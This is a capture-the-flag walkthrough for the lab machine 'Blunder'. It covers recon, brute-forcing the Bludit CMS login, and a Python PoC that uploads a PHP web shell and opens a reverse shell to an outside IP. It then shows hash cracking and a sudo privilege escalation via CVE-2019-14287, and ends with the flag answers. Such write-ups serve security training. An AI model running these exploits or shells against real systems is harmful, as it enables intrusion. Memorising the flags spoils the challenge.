# Blunder - Easy

```shell
sudo vim /etc/hosts
#add blunder.htb

nmap -T4 -p- -A -Pn -v blunder.htb

gobuster dir -u http://blunder.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml -t 50

searchsploit bludit

#get exploit from Exploit DB

cewl http://blunder.htb -d 3 -w bludit-pass.txt -m 5 -v
#generate wordlist using cewl

vim bludit-usernames.txt
#usernames - admin and fergus

python3 bludit-brute-bypass.py -l http://blunder.htb/admin/login -u ~/bludit-users.txt -p ~/bludit-pass.txt
#gives valid creds

#get bludit rce exploit
#modify it
vim bludit-rce.py

nc -nvlp 443

#run exploit
python3 bludit-rce.py
#this gives us reverse shell

#stabilize reverse shell
export TERM=xterm

#Ctrl+Z to background shell
stty raw -echo; fg
#Enter twice to use reverse shell

id
#www-data

ls -la /

ls -la /ftp
#this contains a note and config files
#go through these files

ls -la /var/www

ls -la /var/www/bludit-3.9.2
#enumerate through files

cat /var/www/bludit-3.9.2/bl-content/databases/users.php
#contains salted hashes
#cannot be cracked

ls -la /var/www/bludit-3.10.0a
#enumerate newer version

cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
#contains unsalted SHA1 hash
#for user 'hugo'

#on attacker machine
hashcat -a 0 -m 100 hash.txt /usr/share/wordlists/kaonashi.txt
#cracks the password

su hugo
#use cracked hash

cat user.txt

sudo -l
#we can execute bash as all users but root
#this mentions !root

#follow CVE-2019-14287
sudo -u#-1 /bin/bash

#we get root shell
```

```python
#!/usr/bin/env python

import requests
import re

# PoC by @hg8
# Credit: @christasa
# https://github.com/bludit/bludit/issues/1081

url = "http://blunder.htb"
user = "fergus"
password = "RolandDeschain"
cmd = "bash -c 'sh -i >& /dev/tcp/10.10.14.8/443 0>&1'"


def admin_login():
    s = requests.Session()
    login_page = s.get(f"{url}/admin/")
    csrf_token = re.search('"tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    data = {
        "username": user,
        "password": password,
        "tokenCSRF": csrf_token
    }

    r = s.post(f"{url}/admin/", data, allow_redirects=False)

    if r.status_code != 301:
        print("[!] Username or password incorrect.")
        exit()

    print("[+] Login successful.")
    return s


def get_csrf(s):
    r = s.get(f"{url}/admin/")
    csrf_token = r.text.split('var tokenCSRF = "')[1].split('"')[0]
    print(f"[+] Token CSRF: {csrf_token}")
    return csrf_token


def upload_shell(s, csrf_token):
    data = {
        "uuid": "../../tmp",
        "tokenCSRF": csrf_token
    }

    multipart = [('images[]', ("blut.png", "<?php shell_exec(\"rm .htaccess;rm blut.png;" + cmd + "\");?>", 'image/png'))]

    r = s.post(f"{url}/admin/ajax/upload-images", data, files=multipart)

    if r.status_code != 200:
        print("[!] Error uploading Shell.")
        print("[!] Make sure Bludit version >= 3.9.2.")

    print("[+] Shell upload succesful.")

    multipart_htaccess = [('images[]', ('.htaccess', "RewriteEngine off\r\nAddType application/x-httpd-php .png", 'image/png'))]
    r = s.post(url + "/admin/ajax/upload-images", data, files=multipart_htaccess)

    if r.status_code != 200:
        print("[!] Error uploading .htaccess.")
        print("[!] Make sure Bludit version >= 3.9.2.")

    print("[+] .htaccess upload succesful.")


def execute_cmd(s):
    try:
        r = s.get(f"{url}/bl-content/tmp/blut.png", timeout=1)
    except requests.exceptions.ReadTimeout:
        pass

    print("[+] Command Execution Successful.")


if __name__ == '__main__':
    session = admin_login()
    csrf_token = get_csrf(session)
    upload_shell(session, csrf_token)
    execute_cmd(session)
```

* Open ports & services:

  * 80 - http - Apache httpd 2.4.41 (Ubuntu)

* We have only one port open, so we can check the webpage.

* Using ```gobuster```, we can enumerate web directories in background.

* The website is a blog page and it contains a few blog posts - we can read through them for clues.

* Meanwhile ```gobuster``` gives us the following directories:

  * /admin
  * /install.php
  * /todo.txt

* /admin leads to a login portal for ```bludit``` - this is a CMS.

* /install.php says we have ```bludit``` installed already.

* /todo.txt lists a few points for the CMS - the key point mentions the clues 'fergus', who could be an admin user; and images required.

* We can now search for exploits related to ```bludit```.

* There are exploits for ```Bludit``` auth bruteforce and bypass - we can take a look at the Python script from Exploit-DB.

* We need wordlists for usernames and passwords - for usernames, we can use 'admin' and 'fergus'.

* For password wordlists, we can generate a wordlist using ```cewl``` based on the words used in the blog page.

* Running the exploit script for bruteforce, we get the valid creds "fergus:RolandDeschain".

* Logging in as 'fergus' gives us acccess to the blogpage dashboard; we need to get RCE now.

* We have multiple exploits for RCE in ```Bludit``` on Github.

* Download & modify the Python script; set up a listener and run the script.

* This gives us a reverse-shell as 'www-data' user.

* We can start with enumeration of common directories such as the root directory, the home folders, the web directory and the /opt folder.

* We have two users - hugo and shaun.

* Now, the root directory includes a ftp folder - which contains a 'note.txt' file.

* This note is for 'sophie' from 'shaun'; it mentions another thing and a method - we have to enumerate further.

* Checking the web directory, we have two versions of ```bludit``` - 3.9.2 and 3.10.0a

* We need to enumerate both these version directories and check for any stored passwords.

* In the older version, we can find some creds in the 'bl-content/databases/users.php' file - these are salted hashes however, and it is not possible to crack these passwords easily.

* Checking the same directory in the newer version of ```bludit```, we can see that the 'users.php' in this file contains an unsalted hash for user 'hugo'.

* This SHA1 hash can be cracked using ```hashcat``` or any online services - and we get the password.

* Using ```su```, we can switch to user 'hugo' with this password.

* Checking ```sudo -l```, it shows that we can run '/bin/bash' as all users but root.

* The keywords specified are ```ALL``` and ```!root``` - we can bypass this.

* This can be exploited by following CVE-2019-14287, which bypasses this type of sudo permissions.

* Following the exploit which is available online, we are able to get root shell.

```markdown
1. User flag - 72846c6a33e72a87eb7f73a9530b3893

2. Root flag - a0dc78c246afdfafc297d8268ee833b9
```
